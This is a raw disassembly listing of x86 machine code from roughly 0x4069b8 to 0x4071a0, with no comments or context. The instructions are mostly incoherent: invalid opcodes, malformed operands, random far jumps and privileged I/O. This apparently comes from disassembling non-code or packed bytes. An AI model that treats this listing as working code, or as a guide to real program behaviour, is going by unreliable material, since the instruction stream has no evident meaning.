  4069b8:	xor    BYTE PTR [esp+esi*4],dh
  4069bb:	cmp    dl,BYTE PTR [ecx-0x7a1c5ab1]
  4069c1:	mov    edx,0x8c05c66
  4069c6:	cmp    BYTE PTR [eax+0x5],0x5f
  4069ca:	mov    DWORD PTR [ebp+0x7e],edx
  4069cd:	jp     0x406950
  4069cf:	(bad)  
  4069d0:	push   ebx
  4069d1:	cmp    dl,BYTE PTR [edi-0x619f3661]
  4069d7:	jne    0x406a57
  4069d9:	sbb    bh,BYTE PTR [edx]
  4069db:	(bad)  
  4069dc:	std    
  4069dd:	or     BYTE PTR [edx],dl
  4069df:	xor    al,0xeb
  4069e1:	in     al,0x4c
  4069e3:	into   
  4069e4:	mul    DWORD PTR [edx+0x136f9b39]
  4069ea:	(bad)  
  4069eb:	ins    DWORD PTR es:[edi],dx
  4069ec:	mov    esi,0x2cb2de2c
  4069f1:	std    
  4069f2:	xchg   ebp,eax
  4069f3:	aam    0xf0
  4069f5:	out    dx,eax
  4069f6:	call   0x613c:0xdbd0f208
  4069fd:	(bad)  
  4069fe:	retf   0xcf1e
  406a01:	es cmc 
  406a03:	dec    ebx
  406a04:	add    BYTE PTR [ecx-0x76b66564],0xf0
  406a0b:	pop    ds
  406a0c:	sbb    BYTE PTR [ecx+0x19],cl
  406a0f:	loopne 0x406a1d
  406a11:	sahf   
  406a12:	fisttp DWORD PTR [ebx]
  406a14:	sbb    ecx,ebx
  406a16:	push   esi
  406a17:	xchg   DWORD PTR [edi+0x4578170c],ebp
  406a1d:	pushf  
  406a1e:	add    al,al
  406a20:	dec    ecx
  406a21:	cmp    DWORD PTR [ebx+0x40],eax
  406a24:	jecxz  0x406a35
  406a26:	mov    ds:0x3f4bd1a8,eax
  406a2b:	pushf  
  406a2c:	pop    esi
  406a2d:	sbb    edi,ecx
  406a2f:	pop    eax
  406a30:	scas   eax,DWORD PTR es:[edi]
  406a31:	dec    esp
  406a32:	mov    al,0xd2
  406a34:	adc    esp,eax
  406a36:	mov    dl,0xeb
  406a38:	xchg   esi,eax
  406a39:	fidivr DWORD PTR [edx]
  406a3b:	sahf   
  406a3c:	dec    esp
  406a3d:	stc    
  406a3e:	xchg   edx,eax
  406a3f:	push   es
  406a40:	imul   eax,DWORD PTR [ebp+0x3cebcba9],0x42
  406a47:	test   BYTE PTR [edx-0x51],0x69
  406a4b:	fst    QWORD PTR [esi+eiz*2]
  406a4e:	mov    dl,0x3e
  406a50:	ins    DWORD PTR es:[edi],dx
  406a51:	jecxz  0x406a3b
  406a53:	mov    ds:0x20075d47,al
  406a58:	jge    0x406a8c
  406a5a:	mov    edx,0x2f8b5d58
  406a5f:	push   ebx
  406a60:	inc    esi
  406a61:	push   ebx
  406a62:	lea    ebp,[esi+eax*8+0x1f42cf56]
  406a69:	aam    0xc7
  406a6b:	cmp    DWORD PTR [edx+0x54],ebp
  406a6e:	jp     0x406adf
  406a70:	test   DWORD PTR [ebx-0x3c22df60],ebx
  406a76:	(bad)  
  406a77:	pop    ds
  406a78:	jmp    0x406a69
  406a7a:	push   ss
  406a7b:	push   0x6f0cf358
  406a80:	cmp    BYTE PTR [ebp+0x70],cl
  406a83:	mov    al,0x6f
  406a85:	loop   0x406ac0
  406a87:	icebp  
  406a88:	arpl   bx,di
  406a8a:	and    ecx,0x88f3fce1
  406a90:	popa   
  406a91:	mov    ds:0x178d029f,eax
  406a96:	sub    al,0x6c
  406a98:	(bad)  
  406a99:	aad    0x5f
  406a9b:	sbb    al,0x44
  406a9d:	mov    DWORD PTR [ecx-0x1],ecx
  406aa0:	xor    esi,eax
  406aa2:	adc    DWORD PTR [ebx],edi
  406aa4:	pop    esp
  406aa5:	mov    dh,BYTE PTR [ebx+0x4e]
  406aa8:	push   edi
  406aa9:	js     0x406a73
  406aab:	mov    ebp,fs
  406aad:	ins    BYTE PTR es:[edi],dx
  406aae:	adc    DWORD PTR [esi-0x4ab30721],esp
  406ab4:	or     BYTE PTR [edi-0x5128c77b],dh
  406aba:	mov    esi,0x63b09958
  406abf:	sub    al,BYTE PTR [esi]
  406ac1:	ins    DWORD PTR es:[edi],dx
  406ac2:	or     BYTE PTR [esp+ebp*1-0x24d9ea10],ch
  406ac9:	stos   BYTE PTR es:[edi],al
  406aca:	xchg   ebx,eax
  406acb:	shl    DWORD PTR [ebx+0x4f],cl
  406ace:	jno    0x406b2a
  406ad0:	sub    ecx,DWORD PTR [esp]
  406ad3:	mov    ebx,0x80dd2d75
  406ad8:	pop    es
  406ad9:	es es jmp 0x4b42:0x7b4562b9
  406ae2:	pop    ds
  406ae3:	push   esp
  406ae4:	pop    edx
  406ae5:	les    eax,FWORD PTR [edx]
  406ae7:	inc    esi
  406ae8:	out    0x58,al
  406aea:	mov    ds:0x1a42295c,al
  406aef:	sub    BYTE PTR [ecx-0x109145d6],cl
  406af5:	aaa    
  406af6:	fld    TBYTE PTR [edx+0x4]
  406af9:	imul   ecx,DWORD PTR [ebp+0x77de58f7],0x8f167cc
  406b03:	inc    edi
  406b04:	push   0x9
  406b06:	das    
  406b07:	(bad)  [esp+esi*2]
  406b0a:	sub    eax,0x5648865a
  406b0f:	lods   eax,DWORD PTR ds:[esi]
  406b10:	popa   
  406b11:	pop    ebp
  406b12:	sbb    al,0x48
  406b14:	sub    DWORD PTR [esi],eax
  406b16:	in     eax,dx
  406b17:	aas    
  406b18:	mov    WORD PTR [ecx-0x70],?
  406b1b:	push   0xffffffe0
  406b1d:	jo     0x406ae7
  406b1f:	les    ecx,FWORD PTR [ecx+0x485e8d68]
  406b25:	fiadd  DWORD PTR [eax+0x29dd7bfc]
  406b2b:	shl    BYTE PTR [eax-0x285976be],0xc0
  406b32:	or     bl,dh
  406b34:	mov    ds:0xbc831dc4,eax
  406b39:	jp     0x406b8b
  406b3b:	clc    
  406b3c:	lods   al,BYTE PTR ds:[esi]
  406b3d:	pop    edx
  406b3e:	imul   ebp,DWORD PTR [edx+0x4],0xada0b086
  406b45:	jo     0x406b15
  406b47:	push   esp
  406b48:	retf   
  406b49:	push   edi
  406b4a:	jnp    0x406b1e
  406b4c:	(bad)
  406b51:	loopne 0x406b2c
  406b53:	pusha  
  406b54:	(bad)  
  406b55:	push   ss
  406b56:	mov    cl,0x1a
  406b58:	jne    0x406b07
  406b5a:	repnz dec esi
  406b5c:	das    
  406b5d:	mov    DWORD PTR [edx+0x3a],edx
  406b60:	in     eax,dx
  406b61:	xor    esp,DWORD PTR gs:[edx+0x10385eae]
  406b68:	jecxz  0x406b56
  406b6a:	daa    
  406b6b:	ins    BYTE PTR es:[edi],dx
  406b6c:	mov    cl,0x9c
  406b6e:	out    0x22,al
  406b70:	(bad)  
  406b71:	fst    DWORD PTR [ecx+0x40c87fc2]
  406b77:	call   0x6d8f0881
  406b7c:	jne    0x406b38
  406b7e:	dec    esi
  406b7f:	push   edi
  406b80:	push   ebp
  406b81:	aad    0xbb
  406b83:	hlt    
  406b84:	in     eax,dx
  406b85:	iret   
  406b86:	outs   dx,DWORD PTR ds:[esi]
  406b87:	stos   DWORD PTR es:[edi],eax
  406b88:	retf   0x3a19
  406b8b:	pop    es
  406b8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b8d:	pop    ss
  406b8e:	push   edi
  406b8f:	add    eax,0xd1d4f4ac
  406b94:	inc    ecx
  406b95:	dec    ebp
  406b96:	stos   DWORD PTR es:[edi],eax
  406b97:	xor    edi,DWORD PTR [edi-0x3d]
  406b9a:	xchg   ebx,eax
  406b9b:	ret    0xea5b
  406b9e:	cmp    al,0x58
  406ba0:	call   DWORD PTR [edx]
  406ba2:	js     0x406b6d
  406ba4:	pop    edi
  406ba5:	retf   0xcbce
  406ba8:	bnd jns 0x406b84
  406bab:	inc    ebp
  406bac:	or     BYTE PTR [esi+0x34],ch
  406baf:	jecxz  0x406b73
  406bb1:	test   eax,0x3678b9b4
  406bb6:	jg     0x406b71
  406bb8:	cli    
  406bb9:	sbb    ch,BYTE PTR [edi+0xd]
  406bbc:	(bad)  
  406bbd:	jp     0x406b48
  406bbf:	xor    eax,0x9c7d54f5
  406bc4:	(bad)  
  406bc5:	mov    BYTE PTR [ebp-0x3],0x2a
  406bc9:	jae    0x406b56
  406bcb:	(bad)  
  406bcc:	dec    ebp
  406bcd:	pop    esi
  406bce:	(bad)  
  406bd0:	std    
  406bd1:	neg    al
  406bd3:	xchg   edx,eax
  406bd4:	and    bh,BYTE PTR ds:0x4d96bf89
  406bda:	sub    DWORD PTR [eax+0x75],ecx
  406bdd:	sbb    al,0xd0
  406bdf:	fsub   DWORD PTR [eax]
  406be1:	ds sbb ebp,esp
  406be4:	fs js  0x406ba0
  406be7:	jb     0x406c32
  406be9:	cmp    DWORD PTR [edx],edx
  406beb:	add    bh,al
  406bed:	sbb    al,0x41
  406bef:	pop    esp
  406bf0:	fdivr  DWORD PTR [edi+ecx*8-0xfe724b]
  406bf7:	in     eax,0x4d
  406bf9:	jmp    0xcc1e5f54
  406bfe:	cdq    
  406bff:	test   al,0x20
  406c01:	mov    bh,0xf5
  406c03:	(bad)  
  406c04:	mov    edi,0x15d0edb2
  406c09:	int    0x19
  406c0b:	push   ebx
  406c0c:	out    dx,al
  406c0d:	inc    ebx
  406c0e:	mov    ds:0xbf7580e1,al
  406c13:	mov    edi,0xcface650
  406c18:	or     DWORD PTR [ecx+esi*4-0x50f2786e],esi
  406c1f:	adc    WORD PTR [esi],di
  406c22:	jle    0x406c45
  406c24:	mov    ebx,0xf4890e0a
  406c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c2a:	xchg   esi,eax
  406c2b:	adc    BYTE PTR [ebp-0x77d33f68],ch
  406c31:	fs pop ecx
  406c33:	xor    bl,cl
  406c35:	adc    bl,ch
  406c37:	je     0x406c84
  406c39:	aaa    
  406c3a:	into   
  406c3b:	xchg   edi,eax
  406c3c:	ficomp WORD PTR [ebp-0x46]
  406c3f:	ret    0x686f
  406c42:	je     0x406c49
  406c44:	shl    DWORD PTR [ecx+0x17bee5c4],cl
  406c4a:	popf   
  406c4b:	daa    
  406c4c:	cs mov db2,esp
  406c50:	jb     0x406c5c
  406c52:	push   cs
  406c53:	jmp    0x406c91
  406c55:	push   cs
  406c56:	loopne 0x406c7a
  406c58:	mov    al,0xc3
  406c5a:	adc    bl,BYTE PTR [ebx+esi*8-0x5c]
  406c5e:	inc    esi
  406c5f:	mov    eax,ds:0x713e0021
  406c64:	(bad)  
  406c66:	cmp    BYTE PTR [ecx+ebx*1],dh
  406c69:	xor    eax,0x1fefc454
  406c6e:	data16 shl bh,1
  406c71:	daa    
  406c72:	add    DWORD PTR [edi+ecx*1+0x3a48aebd],esp
  406c79:	das    
  406c7a:	push   ebp
  406c7b:	dec    esi
  406c7c:	aad    0x23
  406c7e:	mov    eax,ds:0x2b2c600
  406c83:	(bad)  
  406c85:	fucom  st(1)
  406c87:	mov    esp,0x26bca9c5
  406c8c:	mov    WORD PTR [esi+0x26],gs
  406c8f:	vpaddusb xmm1,xmm7,XMMWORD PTR [eax]
  406c93:	sub    eax,0x910b0813
  406c98:	add    DWORD PTR [edi],edx
  406c9a:	ja     0x406d0a
  406c9c:	jns    0x406c7a
  406c9e:	and    al,BYTE PTR [edx+esi*1+0x2e]
  406ca2:	in     al,0x90
  406ca4:	fwait
  406ca5:	xchg   BYTE PTR [ebx+ecx*2+0x4129ebe7],ch
  406cac:	xor    dl,al
  406cae:	imul   edx,DWORD PTR [eiz*4-0x2e6650b4],0xffffff97
  406cb6:	jmp    DWORD PTR [eax+0x46]
  406cb9:	inc    esp
  406cba:	or     al,0x2c
  406cbc:	and    eax,0x5812bee2
  406cc1:	sub    DWORD PTR [ecx],eax
  406cc3:	das    
  406cc4:	adc    DWORD PTR [edx+0x5b],esi
  406cc7:	(bad)  [edx+0x44810a9d]
  406ccd:	sar    esp,cl
  406ccf:	ins    BYTE PTR es:[edi],dx
  406cd0:	and    DWORD PTR [edi+eiz*8-0x41767486],ecx
  406cd7:	hlt    
  406cd8:	and    bl,al
  406cda:	jno    0x406c6a
  406cdc:	gs shl bl,1
  406cdf:	cmp    ebp,esi
  406ce1:	mov    edi,0xbcfa412b
  406ce6:	pusha  
  406ce7:	popa   
  406ce8:	daa    
  406ce9:	xchg   DWORD PTR ds:[esi+0x7c],ecx
  406ced:	dec    esp
  406cee:	dec    ebx
  406cef:	dec    ecx
  406cf0:	and    ebp,esi
  406cf2:	xchg   edi,eax
  406cf3:	fldenv [esi]
  406cf5:	popa   
  406cf6:	jnp    0x406d46
  406cf8:	jb     0x406d2a
  406cfa:	hlt    
  406cfb:	cwde   
  406cfc:	xadd   BYTE PTR [esi+ebp*4+0x58f50283],cl
  406d04:	loop   0x406c93
  406d06:	cmp    BYTE PTR [esi-0x5594afa6],ah
  406d0c:	mov    esi,0x494abdd6
  406d11:	push   ebx
  406d12:	add    BYTE PTR [ecx+0x26e6cb5f],dh
  406d18:	mov    edx,0x707d2c17
  406d1d:	inc    edx
  406d1e:	leave  
  406d1f:	mov    DWORD PTR [esi-0x70],esp
  406d22:	test   DWORD PTR [eax-0x72],0xf1410649
  406d29:	dec    ecx
  406d2a:	push   ds
  406d2b:	sbb    eax,0xd200755d
  406d30:	mov    ?,WORD PTR [ecx]
  406d32:	(bad)
  406d37:	enter  0xcda,0xdf
  406d3b:	xlat   BYTE PTR ds:[ebx]
  406d3c:	push   0x72e535cb
  406d41:	mov    esp,0xea9c7669
  406d46:	push   esi
  406d47:	adc    eax,0x2a52a6a0
  406d4c:	dec    esp
  406d4d:	gs inc bx
  406d50:	fsub   DWORD PTR [edx+ebx*4-0x44]
  406d54:	ficom  WORD PTR [eax-0x7d]
  406d57:	pop    ds
  406d58:	push   esi
  406d59:	in     al,0xc7
  406d5b:	dec    edx
  406d5c:	inc    edx
  406d5d:	int3   
  406d5e:	cli    
  406d5f:	add    eax,0x6f1edfab
  406d64:	out    dx,eax
  406d65:	sbb    al,0xd3
  406d67:	stc    
  406d68:	and    al,dh
  406d6a:	ja     0x406d5a
  406d6c:	xchg   edx,eax
  406d6d:	sbb    BYTE PTR [edi+eiz*1],ah
  406d70:	popf   
  406d71:	arpl   bp,bx
  406d73:	jge    0x406dab
  406d75:	stc    
  406d76:	sbb    edi,DWORD PTR [edx+0x2b44031e]
  406d7c:	jbe    0x406d09
  406d7e:	stc    
  406d7f:	sub    DWORD PTR [edi-0x614b19c3],0x5a5c4717
  406d89:	xchg   ebx,eax
  406d8a:	xchg   ebx,eax
  406d8b:	or     eax,DWORD PTR [ecx]
  406d8d:	push   edi
  406d8e:	adc    DWORD PTR [edx-0x2d],ebx
  406d91:	aaa    
  406d92:	push   ecx
  406d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d94:	adc    eax,0xa5e1513b
  406d99:	ins    DWORD PTR es:[edi],dx
  406d9a:	push   esi
  406d9b:	xor    al,0xe3
  406d9d:	outs   dx,BYTE PTR ds:[esi]
  406d9e:	xor    BYTE PTR [edi+edx*1],0x4e
  406da2:	nop
  406da3:	ss cmp esp,edi
  406da6:	nop
  406da7:	push   es
  406da8:	sahf   
  406da9:	int3   
  406daa:	rcr    BYTE PTR [eax],cl
  406dac:	fnstsw WORD PTR [ebp+0x7ef60c4f]
  406db2:	test   eax,0x1b528219
  406db7:	mov    edi,0xcad93416
  406dbc:	mov    ds:0xd5f593ad,eax
  406dc1:	jmp    DWORD PTR [eax]
  406dc3:	push   ss
  406dc4:	and    eax,0xde1ea45c
  406dc9:	and    al,0xaf
  406dcb:	xor    DWORD PTR [ecx+ebx*4-0x6dcda983],edi
  406dd2:	pop    edx
  406dd3:	hlt    
  406dd4:	jg     0x406da1
  406dd6:	sbb    al,al
  406dd8:	test   al,0x14
  406dda:	fcmovu st,st(1)
  406ddc:	scas   eax,DWORD PTR es:[edi]
  406ddd:	adc    ebp,ecx
  406ddf:	and    BYTE PTR [ecx-0x41cd42af],dl
  406de5:	dec    ecx
  406de6:	mov    ebx,0xe2238271
  406deb:	test   eax,0x35e40043
  406df1:	xchg   edx,eax
  406df2:	rol    bl,0x80
  406df5:	add    ebp,DWORD PTR [ebx-0x34a5169a]
  406dfb:	mov    ebp,ecx
  406dfd:	jecxz  0x406df9
  406dff:	jno    0x406e03
  406e01:	xor    cl,BYTE PTR [esi]
  406e03:	shr    BYTE PTR [ebp-0x24ea615c],1
  406e09:	sbb    DWORD PTR [edx+eiz*2-0x7a],edx
  406e0d:	scas   al,BYTE PTR es:[edi]
  406e0e:	push   eax
  406e0f:	jg     0x406e55
  406e11:	pop    ebp
  406e12:	and    eax,0x980d4fb6
  406e17:	xchg   ecx,eax
  406e18:	in     eax,0x2a
  406e1a:	cmp    al,0x12
  406e1c:	xor    cl,BYTE PTR [esi]
  406e1e:	call   0x226e:0x9a425e01
  406e25:	fimul  WORD PTR [edi-0x881e47e]
  406e2b:	ins    BYTE PTR es:[edi],dx
  406e2c:	mov    al,ds:0xfca93755
  406e31:	dec    BYTE PTR [eax-0x4da8236f]
  406e37:	dec    edi
  406e38:	adc    al,0xfe
  406e3a:	jecxz  0x406eaa
  406e3c:	cwde   
  406e3d:	jbe    0x406dcb
  406e3f:	fs inc ecx
  406e41:	ret    
  406e42:	mov    ds:0xeb420a34,al
  406e47:	mov    dh,0xec
  406e49:	xor    BYTE PTR [eax],0x7a
  406e4c:	jmp    0x406e9d
  406e4e:	jmp    0x91c2e6aa
  406e53:	ret    0x5be8
  406e56:	xor    ebp,ebp
  406e58:	jmp    0x406df7
  406e5a:	fabs   
  406e5c:	int3   
  406e5d:	add    BYTE PTR [eax-0x1],ch
  406e60:	mov    al,0xf6
  406e62:	dec    eax
  406e63:	lods   al,BYTE PTR ds:[esi]
  406e64:	mov    DWORD PTR [ecx],edi
  406e66:	xor    al,0xa
  406e68:	imul   ebx,esp,0x24
  406e6b:	pop    ebx
  406e6c:	mov    ds:0xc797b5a4,al
  406e71:	or     DWORD PTR [esi-0x61],esp
  406e74:	inc    esp
  406e75:	sbb    eax,0x3e4941b9
  406e7a:	ins    DWORD PTR es:[edi],dx
  406e7b:	pop    esp
  406e7c:	fdivp  st(4),st
  406e7e:	or     BYTE PTR [edi-0x33661671],dh
  406e84:	das    
  406e85:	jp     0x406e97
  406e87:	shr    BYTE PTR [ebx+0x4c546300],0xa5
  406e8e:	das    
  406e8f:	lea    ebp,[eiz*2+0x5f8039c2]
  406e96:	iret   
  406e97:	jmp    FWORD PTR [ecx+0x63]
  406e9a:	xchg   edx,eax
  406e9b:	dec    edi
  406e9c:	fld    QWORD PTR [ecx]
  406e9e:	shl    DWORD PTR [ecx],cl
  406ea0:	push   ecx
  406ea1:	inc    edx
  406ea2:	xor    al,0x12
  406ea4:	push   0xa572b65d
  406ea9:	call   0xedf:0xa47e7ff1
  406eb0:	lods   eax,DWORD PTR ds:[esi]
  406eb1:	cmp    ecx,DWORD PTR [eax-0xa]
  406eb4:	adc    BYTE PTR [ebx-0x5e55c8],ch
  406eba:	mov    esp,0x66636f39
  406ebf:	test   eax,0xc474c36b
  406ec4:	xchg   ecx,eax
  406ec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ec6:	xchg   ecx,eax
  406ec7:	inc    edx
  406ec8:	dec    ebp
  406ec9:	push   0xffffffb6
  406ecb:	adc    al,0x2f
  406ecd:	jbe    0x406f47
  406ecf:	or     dh,ch
  406ed1:	add    dh,bh
  406ed3:	mov    al,0x1a
  406ed5:	mov    dl,0x62
  406ed7:	mov    esp,0x575e46fd
  406edc:	fadd   DWORD PTR [eax]
  406ede:	jnp    0x406f17
  406ee0:	fs mov edx,0x3ff5c0e1
  406ee6:	pcmpgtb mm2,QWORD PTR ds:0x33e7c10a
  406eed:	imul   ebx,DWORD PTR [esi+esi*1],0xffffffe6
  406ef1:	test   DWORD PTR [ebx+edi*8+0x663f6939],ebp
  406ef8:	add    DWORD PTR [edi],eax
  406efa:	mov    al,ds:0xbde5071c
  406eff:	popa   
  406f00:	push   edi
  406f01:	xor    al,0x73
  406f03:	mov    WORD PTR [esi],gs
  406f05:	xchg   ecx,eax
  406f06:	pop    esp
  406f07:	cmp    DWORD PTR [edx],edi
  406f09:	cmp    al,0xef
  406f0b:	or     al,0x2
  406f0d:	daa    
  406f0e:	xor    eax,DWORD PTR [ecx-0x7a10b1ab]
  406f14:	mov    ecx,0xe3048f60
  406f19:	pop    ebx
  406f1a:	push   0xa8c36baf
  406f1f:	or     al,0x82
  406f21:	clc    
  406f22:	lock fwait
  406f24:	xchg   ebp,eax
  406f25:	and    DWORD PTR [eax],ecx
  406f27:	(bad)  
  406f28:	add    edi,DWORD PTR [ecx+0xb2245b9]
  406f2e:	sub    edx,edi
  406f30:	jmp    0xe419:0x6bd77e84
  406f37:	test   DWORD PTR [eax],esp
  406f39:	or     esi,DWORD PTR [eax+0x4d]
  406f3c:	out    0x9f,eax
  406f3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f3f:	daa    
  406f40:	xor    dh,ah
  406f42:	add    esi,ebx
  406f44:	cmc    
  406f45:	pop    ebp
  406f46:	or     BYTE PTR [esi-0x13a1af3f],0x7c
  406f4d:	bound  ebp,QWORD PTR [esi-0x6dfab035]
  406f53:	xor    eax,0xf8c69690
  406f58:	lea    ebx,ds:0x8f898e45
  406f5e:	sbb    al,0x39
  406f60:	popa   
  406f61:	cmp    al,0x70
  406f63:	push   eax
  406f64:	test   BYTE PTR [esi],ch
  406f66:	(bad)  
  406f67:	xchg   esi,eax
  406f68:	adc    esi,ebx
  406f6a:	jo     0x406faa
  406f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f6d:	clc    
  406f6e:	loope  0x406f29
  406f70:	jnp    0x406f8d
  406f72:	jg     0x406f73
  406f74:	cli    
  406f75:	ds call 0xffa54106
  406f7b:	nop
  406f7c:	jecxz  0x406f20
  406f7e:	gs inc edi
  406f80:	cmp    BYTE PTR [esi+0x6e],dh
  406f83:	inc    edx
  406f84:	pop    ds
  406f85:	call   0x39b621a6
  406f8a:	mov    bh,0xee
  406f8c:	fxch   st(6)
  406f8e:	retf   
  406f8f:	sbb    BYTE PTR [ecx],bh
  406f91:	mov    WORD PTR [edx],fs
  406f93:	shl    BYTE PTR [ebp+eax*4+0x10],0xbb
  406f98:	jnp    0x406ffe
  406f9a:	mov    ds:0xb850bb12,al
  406f9f:	mov    ebx,0x8d9daa01
  406fa4:	jmp    0xfc799f38
  406fa9:	mov    ebp,0x915b4605
  406fae:	mov    edi,0x5ace1b53
  406fb3:	xor    DWORD PTR [ecx-0x6f],ebx
  406fb6:	mov    BYTE PTR [edx+0x51bb3815],cl
  406fbc:	or     al,0xd5
  406fbe:	add    dl,ch
  406fc0:	push   ss
  406fc1:	xor    BYTE PTR [esp+edx*1+0x1a],dh
  406fc5:	out    0x5c,al
  406fc7:	(bad)  
  406fc9:	sub    ah,al
  406fcb:	sub    dl,dh
  406fcd:	push   ebx
  406fce:	mov    edx,0xb608e315
  406fd3:	jle    0x406f7f
  406fd5:	pop    es
  406fd6:	ret    0x60b7
  406fd9:	shr    ebp,0x2e
  406fdc:	add    esi,DWORD PTR [eax+0x794cf634]
  406fe2:	stc    
  406fe3:	or     BYTE PTR [eax],ch
  406fe5:	or     al,cl
  406fe7:	cmp    eax,0x6a99f8ac
  406fec:	stc    
  406fed:	pop    ebp
  406fee:	in     eax,dx
  406fef:	repnz (bad) 
  406ff1:	repz or ecx,DWORD PTR [ebp-0x3d]
  406ff5:	rcl    DWORD PTR [edi+0x4f80f599],0x22
  406ffc:	out    0x49,eax
  406ffe:	(bad)  
  406fff:	shr    DWORD PTR [ebx+ebp*2+0x24],1
  407003:	pushf  
  407004:	scas   eax,DWORD PTR es:[edi]
  407005:	ss inc edi
  407007:	mov    bl,0xfc
  407009:	or     eax,0x10b84230
  40700e:	in     eax,dx
  40700f:	in     al,0x10
  407011:	shl    cl,cl
  407013:	shl    DWORD PTR [eax],cl
  407015:	call   0xb35e2913
  40701a:	sbb    DWORD PTR [ecx],0xaec5f854
  407020:	jmp    0x9ed0:0x8967c46
  407027:	(bad)  
  407028:	in     eax,dx
  407029:	mov    dl,0xd0
  40702b:	into   
  40702c:	dec    esp
  40702d:	into   
  40702e:	shl    DWORD PTR [eax+0x24],0x28
  407032:	or     edx,ebp
  407034:	scas   eax,DWORD PTR es:[edi]
  407035:	push   ss
  407036:	test   DWORD PTR [edx],eax
  407038:	fbld   TBYTE PTR [esi]
  40703a:	push   DWORD PTR [edx+0x3b3c759]
  407040:	into   
  407041:	jmp    0x406fdb
  407043:	repnz pop esi
  407045:	aas    
  407046:	int    0x57
  407048:	mov    ds:0x1f973e50,al
  40704d:	inc    esp
  40704e:	xchg   esp,eax
  40704f:	cmp    al,cl
  407051:	xchg   edx,eax
  407052:	nop
  407053:	retf   0x821a
  407056:	addr16 mov cl,0x9e
  407059:	xchg   edx,eax
  40705a:	mov    ah,0x5a
  40705c:	jecxz  0x407070
  40705e:	add    DWORD PTR [eax+0x3a],esi
  407061:	clc    
  407062:	and    ebp,DWORD PTR [eax-0xf7b7990]
  407068:	jno    0x406ff9
  40706a:	push   ds
  40706b:	mov    BYTE PTR [ebp-0x79459523],bh
  407071:	mov    BYTE PTR [ebx],dl
  407073:	jmp    0x407098
  407075:	data16 add al,0x5f
  407078:	sbb    DWORD PTR [ecx],0x17
  40707b:	add    al,0x9b
  40707d:	out    dx,eax
  40707e:	mov    edi,0x245d14ac
  407083:	je     0x407052
  407085:	dec    esp
  407086:	leave  
  407087:	aas    
  407088:	pop    ds
  407089:	fistp  WORD PTR [edx]
  40708b:	mov    ds:0xca4f9718,al
  407090:	xchg   edx,eax
  407091:	sub    BYTE PTR [eax+eiz*1-0x7c],bh
  407095:	inc    ebp
  407096:	cs jb  0x407045
  407099:	retf   
  40709a:	xchg   edi,eax
  40709b:	xor    edi,0x7a
  40709e:	pop    esi
  40709f:	mov    eax,0xf2e67eb0
  4070a4:	mov    dl,BYTE PTR [esp+0x3013811c]
  4070ab:	dec    esi
  4070ac:	dec    ecx
  4070ad:	(bad)
  4070b0:	shl    DWORD PTR [ebp+eiz*1-0x4e],1
  4070b4:	cmp    ebx,edi
  4070b6:	fld    TBYTE PTR [ecx+0x1bf58d96]
  4070bc:	and    BYTE PTR [ebp-0x78cde4c5],bl
  4070c2:	test   BYTE PTR [eax+0x39],bh
  4070c5:	sub    al,0x86
  4070c7:	mov    ecx,0x58c8bc9
  4070cc:	inc    edx
  4070cd:	mov    dh,0x3a
  4070cf:	inc    edi
  4070d0:	lods   eax,DWORD PTR ds:[esi]
  4070d1:	and    BYTE PTR [esi-0xd],bl
  4070d4:	inc    ebp
  4070d5:	iret   
  4070d6:	inc    edi
  4070d7:	icebp  
  4070d8:	outs   dx,BYTE PTR ds:[esi]
  4070d9:	push   ds
  4070da:	je     0x4070f6
  4070dc:	xchg   DWORD PTR [edi-0x28bba5b],ecx
  4070e2:	jo     0x407123
  4070e4:	pop    ebp
  4070e5:	hlt    
  4070e6:	pop    esp
  4070e7:	xchg   esp,eax
  4070e8:	sbb    BYTE PTR [edi+0x85af37c],dl
  4070ee:	jmp    0x1fc40a5f
  4070f3:	cmp    DWORD PTR [esi-0x2a],0x7aa9e58c
  4070fa:	int    0xab
  4070fc:	popa   
  4070fd:	rol    BYTE PTR [esi-0x35e9c8b2],1
  407103:	clc    
  407104:	loope  0x40715d
  407106:	(bad)  
  407108:	and    ah,BYTE PTR [ebx+0x2b]
  40710b:	dec    esp
  40710c:	mov    al,0x93
  40710e:	gs ret 
  407110:	push   eax
  407111:	mov    ?,WORD PTR [ebx+0x57b2cb1a]
  407117:	mov    eax,ds:0x6a84cbe2
  40711c:	inc    edi
  40711d:	mov    ecx,0xa75960b5
  407122:	sub    dl,dh
  407124:	std    
  407125:	mov    ?,WORD PTR [eax]
  407127:	mov    ebx,0xbdd05bb5
  40712c:	popf   
  40712d:	es mov ah,0x65
  407130:	and    ch,BYTE PTR [ebx+0x60b108be]
  407136:	ins    DWORD PTR es:[edi],dx
  407137:	xor    ebx,DWORD PTR [ebp-0x4bc2c359]
  40713d:	and    DWORD PTR [ecx],edi
  40713f:	mov    ebx,0xff3e6708
  407144:	pop    ebp
  407145:	in     eax,dx
  407146:	jmp    0x407186
  407148:	call   0x6c725447
  40714d:	push   0xffffffba
  40714f:	dec    esi
  407150:	test   ch,dh
  407152:	fwait
  407153:	and    edx,DWORD PTR [esi+0x1a12187e]
  407159:	sar    BYTE PTR [edx-0x6d],cl
  40715c:	inc    eax
  40715d:	mov    al,0xb5
  40715f:	mov    cl,0x34
  407161:	xchg   DWORD PTR [edx+0x11],eax
  407164:	cdq    
  407165:	or     al,0x15
  407167:	add    DWORD PTR [ebx],ebp
  407169:	ins    DWORD PTR es:[edi],dx
  40716a:	push   ebx
  40716b:	push   0xffffffb5
  40716d:	arpl   WORD PTR [edx+0x42],ax
  407170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407171:	(bad)  
  407172:	jbe    0x407186
  407174:	mov    eax,0x9d59a83b
  407179:	xchg   ebx,eax
  40717a:	mov    bl,0xc8
  40717c:	fs jecxz 0x40718d
  40717f:	repnz xchg ebx,eax
  407181:	enter  0xab68,0xf7
  407185:	ret    0x9ee1
  407188:	xchg   ecx,eax
  407189:	stc    
  40718a:	xchg   ebx,eax
  40718b:	sbb    DWORD PTR [edi-0x25],edi
  40718e:	sbb    BYTE PTR [esi+0x11],0xfd
  407192:	sbb    al,0xbd
  407195:	sub    DWORD PTR [ecx-0x4a],esi
  407198:	imul   eax,ebx,0xc4eba50e
  40719e:	mov    al,0x3a
  4071a0:	sar    DWORD PTR [ebx],0xdb
